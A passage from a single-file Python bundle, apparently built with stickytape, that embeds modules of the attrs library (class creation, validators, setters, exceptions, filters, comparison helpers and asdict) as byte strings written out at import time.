attrs=_f)\n\n\ndef make_class(name, attrs, bases=(object,), **attributes_arguments):\n    """\n    A quick way to create a new class called *name* with *attrs*.\n\n    :param str name: The name for the new class.\n\n    :param attrs: A list of names or a dictionary of mappings of names to\n        attributes.\n\n        If *attrs* is a list or an ordered dict (`dict` on Python 3.6+,\n        `collections.OrderedDict` otherwise), the order is deduced from\n        the order of the names or attributes inside *attrs*.  Otherwise the\n        order of the definition of the attributes is used.\n    :type attrs: `list` or `dict`\n\n    :param tuple bases: Classes that the new class will subclass.\n\n    :param attributes_arguments: Passed unmodified to `attr.s`.\n\n    :return: A new class with *attrs*.\n    :rtype: type\n\n    .. versionadded:: 17.1.0 *bases*\n    .. versionchanged:: 18.1.0 If *attrs* is ordered, the order is retained.\n    """\n    if isinstance(attrs, dict):\n        cls_dict = attrs\n    elif isinstance(attrs, (list, tuple)):\n        cls_dict = dict((a, attrib()) for a in attrs)\n    else:\n        raise TypeError("attrs argument must be a dict or a list.")\n\n    pre_init = cls_dict.pop("__attrs_pre_init__", None)\n    post_init = cls_dict.pop("__attrs_post_init__", None)\n    user_init = cls_dict.pop("__init__", None)\n\n    body = {}\n    if pre_init is not None:\n        body["__attrs_pre_init__"] = pre_init\n    if post_init is not None:\n        body["__attrs_post_init__"] = post_init\n    if user_init is not None:\n        body["__init__"] = user_init\n\n    type_ = new_class(name, bases, {}, lambda ns: ns.update(body))\n\n    # For pickling to work, the __module__ variable needs to be set to the\n    # frame where the class is created.  Bypass this step in environments where\n    # sys._getframe is not defined (Jython for example) or sys._getframe is not\n    # defined for arguments greater than 0 (IronPython).\n    try:\n        type_.__module__ = sys._getframe(1).f_globals.get(\n            "__name__", "__main__"\n        )\n    except (AttributeError, ValueError):\n        pass\n\n    # We do it here for proper warnings with meaningful stacklevel.\n    cmp = attributes_arguments.pop("cmp", None)\n    (\n        attributes_arguments["eq"],\n        attributes_arguments["order"],\n    ) = _determine_attrs_eq_order(\n        cmp,\n        attributes_arguments.get("eq"),\n        attributes_arguments.get("order"),\n        True,\n    )\n\n    return _attrs(these=cls_dict, **attributes_arguments)(type_)\n\n\n# These are required by within this module so we define them here and merely\n# import into .validators / .converters.\n\n\n@attrs(slots=True, hash=True)\nclass _AndValidator(object):\n    """\n    Compose many validators to a single one.\n    """\n\n    _validators = attrib()\n\n    def __call__(self, inst, attr, value):\n        for v in self._validators:\n            v(inst, attr, value)\n\n\ndef and_(*validators):\n    """\n    A validator that composes multiple validators into one.\n\n    When called on a value, it runs all wrapped validators.\n\n    :param callables validators: Arbitrary number of validators.\n\n    .. versionadded:: 17.1.0\n    """\n    vals = []\n    for validator in validators:\n        vals.extend(\n            validator._validators\n            if isinstance(validator, _AndValidator)\n            else [validator]\n        )\n\n    return _AndValidator(tuple(vals))\n\n\ndef pipe(*converters):\n    """\n    A converter that composes multiple converters into one.\n\n    When called on a value, it runs all wrapped converters, returning the\n    *last* value.\n\n    Type annotations will be inferred from the wrapped converters\', if\n    they have any.\n\n    :param callables converters: Arbitrary number of converters.\n\n    .. versionadded:: 20.1.0\n    """\n\n    def pipe_converter(val):\n        for converter in converters:\n            val = converter(val)\n\n        return val\n\n    if not PY2:\n        if not converters:\n            # If the converter list is empty, pipe_converter is the identity.\n            A = typing.TypeVar("A")\n            pipe_converter.__annotations__ = {"val": A, "return": A}\n        else:\n            # Get parameter type.\n            sig = None\n            try:\n                sig = inspect.signature(converters[0])\n            except (ValueError, TypeError):  # inspect failed\n                pass\n            if sig:\n                params = list(sig.parameters.values())\n                if (\n                    params\n                    and params[0].annotation is not inspect.Parameter.empty\n                ):\n                    pipe_converter.__annotations__["val"] = params[\n                        0\n                    ].annotation\n            # Get return type.\n            sig = None\n            try:\n                sig = inspect.signature(converters[-1])\n            except (ValueError, TypeError):  # inspect failed\n                pass\n            if sig and sig.return_annotation is not inspect.Signature().empty:\n                pipe_converter.__annotations__[\n                    "return"\n                ] = sig.return_annotation\n\n    return pipe_converter\n')
    __stickytape_write_module('attr/_config.py', b'# SPDX-License-Identifier: MIT\n\nfrom __future__ import absolute_import, division, print_function\n\n\n__all__ = ["set_run_validators", "get_run_validators"]\n\n_run_validators = True\n\n\ndef set_run_validators(run):\n    """\n    Set whether or not validators are run.  By default, they are run.\n\n    .. deprecated:: 21.3.0 It will not be removed, but it also will not be\n        moved to new ``attrs`` namespace. Use `attrs.validators.set_disabled()`\n        instead.\n    """\n    if not isinstance(run, bool):\n        raise TypeError("\'run\' must be bool.")\n    global _run_validators\n    _run_validators = run\n\n\ndef get_run_validators():\n    """\n    Return whether or not validators are run.\n\n    .. deprecated:: 21.3.0 It will not be removed, but it also will not be\n        moved to new ``attrs`` namespace. Use `attrs.validators.get_disabled()`\n        instead.\n    """\n    return _run_validators\n')
    __stickytape_write_module('attr/setters.py', b'# SPDX-License-Identifier: MIT\n\n"""\nCommonly used hooks for on_setattr.\n"""\n\nfrom __future__ import absolute_import, division, print_function\n\nfrom . import _config\nfrom .exceptions import FrozenAttributeError\n\n\ndef pipe(*setters):\n    """\n    Run all *setters* and return the return value of the last one.\n\n    .. versionadded:: 20.1.0\n    """\n\n    def wrapped_pipe(instance, attrib, new_value):\n        rv = new_value\n\n        for setter in setters:\n            rv = setter(instance, attrib, rv)\n\n        return rv\n\n    return wrapped_pipe\n\n\ndef frozen(_, __, ___):\n    """\n    Prevent an attribute to be modified.\n\n    .. versionadded:: 20.1.0\n    """\n    raise FrozenAttributeError()\n\n\ndef validate(instance, attrib, new_value):\n    """\n    Run *attrib*\'s validator on *new_value* if it has one.\n\n    .. versionadded:: 20.1.0\n    """\n    if _config._run_validators is False:\n        return new_value\n\n    v = attrib.validator\n    if not v:\n        return new_value\n\n    v(instance, attrib, new_value)\n\n    return new_value\n\n\ndef convert(instance, attrib, new_value):\n    """\n    Run *attrib*\'s converter -- if it has one --  on *new_value* and return the\n    result.\n\n    .. versionadded:: 20.1.0\n    """\n    c = attrib.converter\n    if c:\n        return c(new_value)\n\n    return new_value\n\n\nNO_OP = object()\n"""\nSentinel for disabling class-wide *on_setattr* hooks for certain attributes.\n\nDoes not work in `pipe` or within lists.\n\n.. versionadded:: 20.1.0\n"""\n')
    __stickytape_write_module('attr/exceptions.py', b'# SPDX-License-Identifier: MIT\n\nfrom __future__ import absolute_import, division, print_function\n\n\nclass FrozenError(AttributeError):\n    """\n    A frozen/immutable instance or attribute have been attempted to be\n    modified.\n\n    It mirrors the behavior of ``namedtuples`` by using the same error message\n    and subclassing `AttributeError`.\n\n    .. versionadded:: 20.1.0\n    """\n\n    msg = "can\'t set attribute"\n    args = [msg]\n\n\nclass FrozenInstanceError(FrozenError):\n    """\n    A frozen instance has been attempted to be modified.\n\n    .. versionadded:: 16.1.0\n    """\n\n\nclass FrozenAttributeError(FrozenError):\n    """\n    A frozen attribute has been attempted to be modified.\n\n    .. versionadded:: 20.1.0\n    """\n\n\nclass AttrsAttributeNotFoundError(ValueError):\n    """\n    An ``attrs`` function couldn\'t find an attribute that the user asked for.\n\n    .. versionadded:: 16.2.0\n    """\n\n\nclass NotAnAttrsClassError(ValueError):\n    """\n    A non-``attrs`` class has been passed into an ``attrs`` function.\n\n    .. versionadded:: 16.2.0\n    """\n\n\nclass DefaultAlreadySetError(RuntimeError):\n    """\n    A default has been set using ``attr.ib()`` and is attempted to be reset\n    using the decorator.\n\n    .. versionadded:: 17.1.0\n    """\n\n\nclass UnannotatedAttributeError(RuntimeError):\n    """\n    A class with ``auto_attribs=True`` has an ``attr.ib()`` without a type\n    annotation.\n\n    .. versionadded:: 17.3.0\n    """\n\n\nclass PythonTooOldError(RuntimeError):\n    """\n    It was attempted to use an ``attrs`` feature that requires a newer Python\n    version.\n\n    .. versionadded:: 18.2.0\n    """\n\n\nclass NotCallableError(TypeError):\n    """\n    A ``attr.ib()`` requiring a callable has been set with a value\n    that is not callable.\n\n    .. versionadded:: 19.2.0\n    """\n\n    def __init__(self, msg, value):\n        super(TypeError, self).__init__(msg, value)\n        self.msg = msg\n        self.value = value\n\n    def __str__(self):\n        return str(self.msg)\n')
    __stickytape_write_module('attr/filters.py', b'# SPDX-License-Identifier: MIT\n\n"""\nCommonly useful filters for `attr.asdict`.\n"""\n\nfrom __future__ import absolute_import, division, print_function\n\nfrom ._compat import isclass\nfrom ._make import Attribute\n\n\ndef _split_what(what):\n    """\n    Returns a tuple of `frozenset`s of classes and attributes.\n    """\n    return (\n        frozenset(cls for cls in what if isclass(cls)),\n        frozenset(cls for cls in what if isinstance(cls, Attribute)),\n    )\n\n\ndef include(*what):\n    """\n    Include *what*.\n\n    :param what: What to include.\n    :type what: `list` of `type` or `attrs.Attribute`\\\\ s\n\n    :rtype: `callable`\n    """\n    cls, attrs = _split_what(what)\n\n    def include_(attribute, value):\n        return value.__class__ in cls or attribute in attrs\n\n    return include_\n\n\ndef exclude(*what):\n    """\n    Exclude *what*.\n\n    :param what: What to exclude.\n    :type what: `list` of classes or `attrs.Attribute`\\\\ s.\n\n    :rtype: `callable`\n    """\n    cls, attrs = _split_what(what)\n\n    def exclude_(attribute, value):\n        return value.__class__ not in cls and attribute not in attrs\n\n    return exclude_\n')
    __stickytape_write_module('attr/validators.py', b'# SPDX-License-Identifier: MIT\n\n"""\nCommonly useful validators.\n"""\n\nfrom __future__ import absolute_import, division, print_function\n\nimport operator\nimport re\n\nfrom contextlib import contextmanager\n\nfrom ._config import get_run_validators, set_run_validators\nfrom ._make import _AndValidator, and_, attrib, attrs\nfrom .exceptions import NotCallableError\n\n\ntry:\n    Pattern = re.Pattern\nexcept AttributeError:  # Python <3.7 lacks a Pattern type.\n    Pattern = type(re.compile(""))\n\n\n__all__ = [\n    "and_",\n    "deep_iterable",\n    "deep_mapping",\n    "disabled",\n    "ge",\n    "get_disabled",\n    "gt",\n    "in_",\n    "instance_of",\n    "is_callable",\n    "le",\n    "lt",\n    "matches_re",\n    "max_len",\n    "optional",\n    "provides",\n    "set_disabled",\n]\n\n\ndef set_disabled(disabled):\n    """\n    Globally disable or enable running validators.\n\n    By default, they are run.\n\n    :param disabled: If ``True``, disable running all validators.\n    :type disabled: bool\n\n    .. warning::\n\n        This function is not thread-safe!\n\n    .. versionadded:: 21.3.0\n    """\n    set_run_validators(not disabled)\n\n\ndef get_disabled():\n    """\n    Return a bool indicating whether validators are currently disabled or not.\n\n    :return: ``True`` if validators are currently disabled.\n    :rtype: bool\n\n    .. versionadded:: 21.3.0\n    """\n    return not get_run_validators()\n\n\n@contextmanager\ndef disabled():\n    """\n    Context manager that disables running validators within its context.\n\n    .. warning::\n\n        This context manager is not thread-safe!\n\n    .. versionadded:: 21.3.0\n    """\n    set_run_validators(False)\n    try:\n        yield\n    finally:\n        set_run_validators(True)\n\n\n@attrs(repr=False, slots=True, hash=True)\nclass _InstanceOfValidator(object):\n    type = attrib()\n\n    def __call__(self, inst, attr, value):\n        """\n        We use a callable class to be able to change the ``__repr__``.\n        """\n        if not isinstance(value, self.type):\n            raise TypeError(\n                "\'{name}\' must be {type!r} (got {value!r} that is a "\n                "{actual!r}).".format(\n                    name=attr.name,\n                    type=self.type,\n                    actual=value.__class__,\n                    value=value,\n                ),\n                attr,\n                self.type,\n                value,\n            )\n\n    def __repr__(self):\n        return "<instance_of validator for type {type!r}>".format(\n            type=self.type\n        )\n\n\ndef instance_of(type):\n    """\n    A validator that raises a `TypeError` if the initializer is called\n    with a wrong type for this particular attribute (checks are performed using\n    `isinstance` therefore it\'s also valid to pass a tuple of types).\n\n    :param type: The type to check for.\n    :type type: type or tuple of types\n\n    :raises TypeError: With a human readable error message, the attribute\n        (of type `attrs.Attribute`), the expected type, and the value it\n        got.\n    """\n    return _InstanceOfValidator(type)\n\n\n@attrs(repr=False, frozen=True, slots=True)\nclass _MatchesReValidator(object):\n    pattern = attrib()\n    match_func = attrib()\n\n    def __call__(self, inst, attr, value):\n        """\n        We use a callable class to be able to change the ``__repr__``.\n        """\n        if not self.match_func(value):\n            raise ValueError(\n                "\'{name}\' must match regex {pattern!r}"\n                " ({value!r} doesn\'t)".format(\n                    name=attr.name, pattern=self.pattern.pattern, value=value\n                ),\n                attr,\n                self.pattern,\n                value,\n            )\n\n    def __repr__(self):\n        return "<matches_re validator for pattern {pattern!r}>".format(\n            pattern=self.pattern\n        )\n\n\ndef matches_re(regex, flags=0, func=None):\n    r"""\n    A validator that raises `ValueError` if the initializer is called\n    with a string that doesn\'t match *regex*.\n\n    :param regex: a regex string or precompiled pattern to match against\n    :param int flags: flags that will be passed to the underlying re function\n        (default 0)\n    :param callable func: which underlying `re` function to call (options\n        are `re.fullmatch`, `re.search`, `re.match`, default\n        is ``None`` which means either `re.fullmatch` or an emulation of\n        it on Python 2). For performance reasons, they won\'t be used directly\n        but on a pre-`re.compile`\\ ed pattern.\n\n    .. versionadded:: 19.2.0\n    .. versionchanged:: 21.3.0 *regex* can be a pre-compiled pattern.\n    """\n    fullmatch = getattr(re, "fullmatch", None)\n    valid_funcs = (fullmatch, None, re.search, re.match)\n    if func not in valid_funcs:\n        raise ValueError(\n            "\'func\' must be one of {}.".format(\n                ", ".join(\n                    sorted(\n                        e and e.__name__ or "None" for e in set(valid_funcs)\n                    )\n                )\n            )\n        )\n\n    if isinstance(regex, Pattern):\n        if flags:\n            raise TypeError(\n                "\'flags\' can only be used with a string pattern; "\n                "pass flags to re.compile() instead"\n            )\n        pattern = regex\n    else:\n        pattern = re.compile(regex, flags)\n\n    if func is re.match:\n        match_func = pattern.match\n    elif func is re.search:\n        match_func = pattern.search\n    elif fullmatch:\n        match_func = pattern.fullmatch\n    else:  # Python 2 fullmatch emulation (https://bugs.python.org/issue16203)\n        pattern = re.compile(\n            r"(?:{})\\Z".format(pattern.pattern), pattern.flags\n        )\n        match_func = pattern.match\n\n    return _MatchesReValidator(pattern, match_func)\n\n\n@attrs(repr=False, slots=True, hash=True)\nclass _ProvidesValidator(object):\n    interface = attrib()\n\n    def __call__(self, inst, attr, value):\n        """\n        We use a callable class to be able to change the ``__repr__``.\n        """\n        if not self.interface.providedBy(value):\n            raise TypeError(\n                "\'{name}\' must provide {interface!r} which {value!r} "\n                "doesn\'t.".format(\n                    name=attr.name, interface=self.interface, value=value\n                ),\n                attr,\n                self.interface,\n                value,\n            )\n\n    def __repr__(self):\n        return "<provides validator for interface {interface!r}>".format(\n            interface=self.interface\n        )\n\n\ndef provides(interface):\n    """\n    A validator that raises a `TypeError` if the initializer is called\n    with an object that does not provide the requested *interface* (checks are\n    performed using ``interface.providedBy(value)`` (see `zope.interface\n    <https://zopeinterface.readthedocs.io/en/latest/>`_).\n\n    :param interface: The interface to check for.\n    :type interface: ``zope.interface.Interface``\n\n    :raises TypeError: With a human readable error message, the attribute\n        (of type `attrs.Attribute`), the expected interface, and the\n        value it got.\n    """\n    return _ProvidesValidator(interface)\n\n\n@attrs(repr=False, slots=True, hash=True)\nclass _OptionalValidator(object):\n    validator = attrib()\n\n    def __call__(self, inst, attr, value):\n        if value is None:\n            return\n\n        self.validator(inst, attr, value)\n\n    def __repr__(self):\n        return "<optional validator for {what} or None>".format(\n            what=repr(self.validator)\n        )\n\n\ndef optional(validator):\n    """\n    A validator that makes an attribute optional.  An optional attribute is one\n    which can be set to ``None`` in addition to satisfying the requirements of\n    the sub-validator.\n\n    :param validator: A validator (or a list of validators) that is used for\n        non-``None`` values.\n    :type validator: callable or `list` of callables.\n\n    .. versionadded:: 15.1.0\n    .. versionchanged:: 17.1.0 *validator* can be a list of validators.\n    """\n    if isinstance(validator, list):\n        return _OptionalValidator(_AndValidator(validator))\n    return _OptionalValidator(validator)\n\n\n@attrs(repr=False, slots=True, hash=True)\nclass _InValidator(object):\n    options = attrib()\n\n    def __call__(self, inst, attr, value):\n        try:\n            in_options = value in self.options\n        except TypeError:  # e.g. `1 in "abc"`\n            in_options = False\n\n        if not in_options:\n            raise ValueError(\n                "\'{name}\' must be in {options!r} (got {value!r})".format(\n                    name=attr.name, options=self.options, value=value\n                )\n            )\n\n    def __repr__(self):\n        return "<in_ validator with options {options!r}>".format(\n            options=self.options\n        )\n\n\ndef in_(options):\n    """\n    A validator that raises a `ValueError` if the initializer is called\n    with a value that does not belong in the options provided.  The check is\n    performed using ``value in options``.\n\n    :param options: Allowed options.\n    :type options: list, tuple, `enum.Enum`, ...\n\n    :raises ValueError: With a human readable error message, the attribute (of\n       type `attrs.Attribute`), the expected options, and the value it\n       got.\n\n    .. versionadded:: 17.1.0\n    """\n    return _InValidator(options)\n\n\n@attrs(repr=False, slots=False, hash=True)\nclass _IsCallableValidator(object):\n    def __call__(self, inst, attr, value):\n        """\n        We use a callable class to be able to change the ``__repr__``.\n        """\n        if not callable(value):\n            message = (\n                "\'{name}\' must be callable "\n                "(got {value!r} that is a {actual!r})."\n            )\n            raise NotCallableError(\n                msg=message.format(\n                    name=attr.name, value=value, actual=value.__class__\n                ),\n                value=value,\n            )\n\n    def __repr__(self):\n        return "<is_callable validator>"\n\n\ndef is_callable():\n    """\n    A validator that raises a `attr.exceptions.NotCallableError` if the\n    initializer is called with a value for this particular attribute\n    that is not callable.\n\n    .. versionadded:: 19.1.0\n\n    :raises `attr.exceptions.NotCallableError`: With a human readable error\n        message containing the attribute (`attrs.Attribute`) name,\n        and the value it got.\n    """\n    return _IsCallableValidator()\n\n\n@attrs(repr=False, slots=True, hash=True)\nclass _DeepIterable(object):\n    member_validator = attrib(validator=is_callable())\n    iterable_validator = attrib(\n        default=None, validator=optional(is_callable())\n    )\n\n    def __call__(self, inst, attr, value):\n        """\n        We use a callable class to be able to change the ``__repr__``.\n        """\n        if self.iterable_validator is not None:\n            self.iterable_validator(inst, attr, value)\n\n        for member in value:\n            self.member_validator(inst, attr, member)\n\n    def __repr__(self):\n        iterable_identifier = (\n            ""\n            if self.iterable_validator is None\n            else " {iterable!r}".format(iterable=self.iterable_validator)\n        )\n        return (\n            "<deep_iterable validator for{iterable_identifier}"\n            " iterables of {member!r}>"\n        ).format(\n            iterable_identifier=iterable_identifier,\n            member=self.member_validator,\n        )\n\n\ndef deep_iterable(member_validator, iterable_validator=None):\n    """\n    A validator that performs deep validation of an iterable.\n\n    :param member_validator: Validator to apply to iterable members\n    :param iterable_validator: Validator to apply to iterable itself\n        (optional)\n\n    .. versionadded:: 19.1.0\n\n    :raises TypeError: if any sub-validators fail\n    """\n    return _DeepIterable(member_validator, iterable_validator)\n\n\n@attrs(repr=False, slots=True, hash=True)\nclass _DeepMapping(object):\n    key_validator = attrib(validator=is_callable())\n    value_validator = attrib(validator=is_callable())\n    mapping_validator = attrib(default=None, validator=optional(is_callable()))\n\n    def __call__(self, inst, attr, value):\n        """\n        We use a callable class to be able to change the ``__repr__``.\n        """\n        if self.mapping_validator is not None:\n            self.mapping_validator(inst, attr, value)\n\n        for key in value:\n            self.key_validator(inst, attr, key)\n            self.value_validator(inst, attr, value[key])\n\n    def __repr__(self):\n        return (\n            "<deep_mapping validator for objects mapping {key!r} to {value!r}>"\n        ).format(key=self.key_validator, value=self.value_validator)\n\n\ndef deep_mapping(key_validator, value_validator, mapping_validator=None):\n    """\n    A validator that performs deep validation of a dictionary.\n\n    :param key_validator: Validator to apply to dictionary keys\n    :param value_validator: Validator to apply to dictionary values\n    :param mapping_validator: Validator to apply to top-level mapping\n        attribute (optional)\n\n    .. versionadded:: 19.1.0\n\n    :raises TypeError: if any sub-validators fail\n    """\n    return _DeepMapping(key_validator, value_validator, mapping_validator)\n\n\n@attrs(repr=False, frozen=True, slots=True)\nclass _NumberValidator(object):\n    bound = attrib()\n    compare_op = attrib()\n    compare_func = attrib()\n\n    def __call__(self, inst, attr, value):\n        """\n        We use a callable class to be able to change the ``__repr__``.\n        """\n        if not self.compare_func(value, self.bound):\n            raise ValueError(\n                "\'{name}\' must be {op} {bound}: {value}".format(\n                    name=attr.name,\n                    op=self.compare_op,\n                    bound=self.bound,\n                    value=value,\n                )\n            )\n\n    def __repr__(self):\n        return "<Validator for x {op} {bound}>".format(\n            op=self.compare_op, bound=self.bound\n        )\n\n\ndef lt(val):\n    """\n    A validator that raises `ValueError` if the initializer is called\n    with a number larger or equal to *val*.\n\n    :param val: Exclusive upper bound for values\n\n    .. versionadded:: 21.3.0\n    """\n    return _NumberValidator(val, "<", operator.lt)\n\n\ndef le(val):\n    """\n    A validator that raises `ValueError` if the initializer is called\n    with a number greater than *val*.\n\n    :param val: Inclusive upper bound for values\n\n    .. versionadded:: 21.3.0\n    """\n    return _NumberValidator(val, "<=", operator.le)\n\n\ndef ge(val):\n    """\n    A validator that raises `ValueError` if the initializer is called\n    with a number smaller than *val*.\n\n    :param val: Inclusive lower bound for values\n\n    .. versionadded:: 21.3.0\n    """\n    return _NumberValidator(val, ">=", operator.ge)\n\n\ndef gt(val):\n    """\n    A validator that raises `ValueError` if the initializer is called\n    with a number smaller or equal to *val*.\n\n    :param val: Exclusive lower bound for values\n\n    .. versionadded:: 21.3.0\n    """\n    return _NumberValidator(val, ">", operator.gt)\n\n\n@attrs(repr=False, frozen=True, slots=True)\nclass _MaxLengthValidator(object):\n    max_length = attrib()\n\n    def __call__(self, inst, attr, value):\n        """\n        We use a callable class to be able to change the ``__repr__``.\n        """\n        if len(value) > self.max_length:\n            raise ValueError(\n                "Length of \'{name}\' must be <= {max}: {len}".format(\n                    name=attr.name, max=self.max_length, len=len(value)\n                )\n            )\n\n    def __repr__(self):\n        return "<max_len validator for {max}>".format(max=self.max_length)\n\n\ndef max_len(length):\n    """\n    A validator that raises `ValueError` if the initializer is called\n    with a string or iterable that is longer than *length*.\n\n    :param int length: Maximum length of the string or iterable\n\n    .. versionadded:: 21.3.0\n    """\n    return _MaxLengthValidator(length)\n')
    __stickytape_write_module('attr/_cmp.py', b'# SPDX-License-Identifier: MIT\n\nfrom __future__ import absolute_import, division, print_function\n\nimport functools\n\nfrom ._compat import new_class\nfrom ._make import _make_ne\n\n\n_operation_names = {"eq": "==", "lt": "<", "le": "<=", "gt": ">", "ge": ">="}\n\n\ndef cmp_using(\n    eq=None,\n    lt=None,\n    le=None,\n    gt=None,\n    ge=None,\n    require_same_type=True,\n    class_name="Comparable",\n):\n    """\n    Create a class that can be passed into `attr.ib`\'s ``eq``, ``order``, and\n    ``cmp`` arguments to customize field comparison.\n\n    The resulting class will have a full set of ordering methods if\n    at least one of ``{lt, le, gt, ge}`` and ``eq``  are provided.\n\n    :param Optional[callable] eq: `callable` used to evaluate equality\n        of two objects.\n    :param Optional[callable] lt: `callable` used to evaluate whether\n        one object is less than another object.\n    :param Optional[callable] le: `callable` used to evaluate whether\n        one object is less than or equal to another object.\n    :param Optional[callable] gt: `callable` used to evaluate whether\n        one object is greater than another object.\n    :param Optional[callable] ge: `callable` used to evaluate whether\n        one object is greater than or equal to another object.\n\n    :param bool require_same_type: When `True`, equality and ordering methods\n        will return `NotImplemented` if objects are not of the same type.\n\n    :param Optional[str] class_name: Name of class. Defaults to \'Comparable\'.\n\n    See `comparison` for more details.\n\n    .. versionadded:: 21.1.0\n    """\n\n    body = {\n        "__slots__": ["value"],\n        "__init__": _make_init(),\n        "_requirements": [],\n        "_is_comparable_to": _is_comparable_to,\n    }\n\n    # Add operations.\n    num_order_functions = 0\n    has_eq_function = False\n\n    if eq is not None:\n        has_eq_function = True\n        body["__eq__"] = _make_operator("eq", eq)\n        body["__ne__"] = _make_ne()\n\n    if lt is not None:\n        num_order_functions += 1\n        body["__lt__"] = _make_operator("lt", lt)\n\n    if le is not None:\n        num_order_functions += 1\n        body["__le__"] = _make_operator("le", le)\n\n    if gt is not None:\n        num_order_functions += 1\n        body["__gt__"] = _make_operator("gt", gt)\n\n    if ge is not None:\n        num_order_functions += 1\n        body["__ge__"] = _make_operator("ge", ge)\n\n    type_ = new_class(class_name, (object,), {}, lambda ns: ns.update(body))\n\n    # Add same type requirement.\n    if require_same_type:\n        type_._requirements.append(_check_same_type)\n\n    # Add total ordering if at least one operation was defined.\n    if 0 < num_order_functions < 4:\n        if not has_eq_function:\n            # functools.total_ordering requires __eq__ to be defined,\n            # so raise early error here to keep a nice stack.\n            raise ValueError(\n                "eq must be define is order to complete ordering from "\n                "lt, le, gt, ge."\n            )\n        type_ = functools.total_ordering(type_)\n\n    return type_\n\n\ndef _make_init():\n    """\n    Create __init__ method.\n    """\n\n    def __init__(self, value):\n        """\n        Initialize object with *value*.\n        """\n        self.value = value\n\n    return __init__\n\n\ndef _make_operator(name, func):\n    """\n    Create operator method.\n    """\n\n    def method(self, other):\n        if not self._is_comparable_to(other):\n            return NotImplemented\n\n        result = func(self.value, other.value)\n        if result is NotImplemented:\n            return NotImplemented\n\n        return result\n\n    method.__name__ = "__%s__" % (name,)\n    method.__doc__ = "Return a %s b.  Computed by attrs." % (\n        _operation_names[name],\n    )\n\n    return method\n\n\ndef _is_comparable_to(self, other):\n    """\n    Check whether `other` is comparable to `self`.\n    """\n    for func in self._requirements:\n        if not func(self, other):\n            return False\n    return True\n\n\ndef _check_same_type(self, other):\n    """\n    Return True if *self* and *other* are of the same type, False otherwise.\n    """\n    return other.value.__class__ is self.value.__class__\n')
    __stickytape_write_module('attr/_funcs.py', b'# SPDX-License-Identifier: MIT\n\nfrom __future__ import absolute_import, division, print_function\n\nimport copy\n\nfrom ._compat import iteritems\nfrom ._make import NOTHING, _obj_setattr, fields\nfrom .exceptions import AttrsAttributeNotFoundError\n\n\ndef asdict(\n    inst,\n    recurse=True,\n    filter=None,\n    dict_factory=dict,\n    retain_collection_types=False,\n    value_serializer=None,\n):\n    """\n    Return the ``attrs`` attribute values of *inst* as a dict.\n\n    Optionally recurse into other ``attrs``-decorated classes.\n\n    :param inst: Instance of an ``attrs``-decorated class.\n    :param bool recurse: Recurse into classes that are also\n        ``attrs``-decorated.\n    :param callable filter: A callable whose return code determines whether an\n        attribute or element is included (``True``) or dropped (``False``).  Is\n        called with the `attrs.Attribute` as the first argument and the\n        value as the second argument.\n    :param callable dict_factory: A callable to produce dictionaries from.  For\n        example, to produce ordered dictionaries instead of normal Python\n        dictionaries, pass in ``collections.OrderedDict``.\n    :param bool retain_collection_types: Do not convert to ``list`` when\n        encountering an attribute whose type is ``tuple`` or ``set``.  Only\n        meaningful if ``recurse`` is ``True``.\n    :param Optional[callable] value_serializer: A hook that is called for every\n        attribute or dict key/value.  It receives the current instance, field\n        and value and must return the (updated) value.  The hook is run *after*\n        the optional *filter* has been applied.\n\n    :rtype: return type of *dict_factory*\n\n    :raise attr.exceptions.NotAnAttrsClassError: If *cls* is not an ``attrs``\n        class.\n\n    ..  versionadded:: 16.0.0 *dict_factory*\n    ..  versionadded:: 16.1.0 *retain_collection_types*\n    ..  versionadded:: 20.3.0 *value_serializer*\n    ..  versionadded:: 21.3.0 If a dict has a collection for a key, it is\n        serialized as a tuple.\n    """\n    attrs = fields(inst.__class__)\n    rv = dict_factory()\n    for a in attrs:\n        v = getattr(inst, a.name)\n        if filter is not None and not filter(a, v):\n            continue\n\n        if value_serializer is not None:\n            v = value_serializer(inst, a, v)\n\n        if recurse is True:\n            if has(v.__class__):\n                rv[a.name] = asdict(\n                    v,\n                    recurse=True,\n                    filter=filter,\n                    dict_factory=dict_factory,\n                    retain_collection_types=retain_collection_types,\n                    value_serializer=value_serializer,\n                )\n            elif isinstance(v, (tuple, list, set, frozenset)):\n                cf = v.__class__ if retain_collection_types is True else list\n                rv[a.name] = cf(\n                    [\n                        _asdict_anything(\n                            i,\n                            is_key=False,\n                            filter=filter,\n                            dict_factory=dict_factory,\n                            retain_collection_types=retain_collection_types,\n                            value_serializer=value_serializer,\n                        )\n                        for i in v\n                    ]\n                )\n            elif isinstance(v, dict):\n                df = dict_factory\n                rv[a.name] = df(\n                    (\n                        _asdict_anything(\n                            kk,\n                            is_key=True,\n                            filter=filter,\n                            dict_factory=df,\n                            retain_collection_types=retain_collection_types,\n                            value_serializer=value_serializer,\n                        ),\n                        _asdict_anything(\n                            vv,\n                            is_key=False,\n                            filter=filter,\n                            dict_factory=df,\n                            retain_collection_types=retain_collection_types,\n                            value_serializer=value_serializer,\n                        ),\n                    )\n                    for kk, vv in iteritems(v)\n                )\n            else:\n                rv[a.name] = v\n        else:\n            rv[a.name] = v\n    return rv\n\n\ndef _asdict_anything(\n    val,\n    is_key,\n    filter,\n    dict_factory,\n    retain_collection_types,\n    value_serializer,\n):\n    """\n    ``asdict`` only works on attrs instances, this works on anything.\n    """\n    if getattr(val.__class__, "__attrs_attrs__", None) is not None:\n        # Attrs class.\n        rv = asdict(\n            val,\n            recurse=True,\n            filter=filter,\n            dict_factory=dict_factory,\n            retain_collection_types=retain_collection_types,\n            value_serializer=value_serializer,\n        )\n    elif isinstance(val, (tuple, list, set, frozenset)):\n        if retain_collection_types is True:\n            cf = val.__class__\n        elif is_key:\n            cf = tuple\n        else:\n            cf = list\n\n        rv = cf(\n            [\n                _asdict_anything(\n                    i,\n                    is_key=False,\n                    filter=filter,\n                    dict_factory=dict_factory,\n                    retain_collection_types=retain_collection_types,\n                    value_serializer=value_serializer,\n                )\n                for i in val\n            ]\n        )\n    elif isinstance(val, dict):\n        df = dict_factory\n        rv = df(\n            (\n                _asdict_anything(\n                    kk,\n                    is_key=True,\n                    filter=filter,\n                    dict_factory=df,\n                    retain_collection_types=retain_collection_types,\n                    value_serializer=value_serializer,\n                ),\n                _asdict_anything(\n                    vv,\n                    is_key=False,\n                    filter=filter,\n                    dict_factory=df,\n                    retain_collection_types=retain_collection_types,\n                    value_serializer=value_serializer,\n                ),\n            )\n            for kk, vv in iteritems(val)\n        )\n    else:\n        rv = val\n        if value_serializer is not None:\n            rv = value_serializer(None, None, rv)\n\n    return rv\n\n\ndef astuple(\n    inst,\n    recurse=True,\n    filter=None,\n    tuple_factory=tuple,\n    retain_collection_types=False,\n):\n    """\n    Return the 